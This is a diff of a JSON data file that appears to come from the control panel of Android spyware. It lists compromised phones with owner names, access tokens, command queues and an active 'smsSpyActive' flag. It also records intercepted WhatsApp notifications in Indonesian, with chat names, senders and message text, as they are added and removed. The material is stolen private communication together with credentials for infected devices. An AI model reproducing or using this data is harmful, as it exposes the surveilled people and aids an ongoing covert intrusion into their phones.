@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776781066603,
+    "lastSeen": 1776781080532,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2903 pesan dari 17 chat",
+        "time": "21/04 21:17",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781069623
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎JB || RULZ STORE KALBAR (2 pesan): ~ RulzOraSepele",
@@ -10320,14 +10328,6 @@
         "time": "21/04 20:47",
         "pkg": "com.whatsapp",
         "receivedAt": 1776779235697
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ZUNZ PEKALONGAN (995 pesan): ~ YANZZ",
-        "content": "Pm",
-        "time": "21/04 20:47",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779235288
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776781065197,
+    "lastSeen": 1776781081059,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781066860,
+    "lastSeen": 1776781078839,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
@@ -16704,6 +16704,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎THECLASTUPATT7.4 (8 pesan): nira 7.4",
+        "content": "Menunggu pesan ini. Ini mungkin membutuhkan waktu beberapa saat.",
+        "time": "21/04 21:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781081478
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
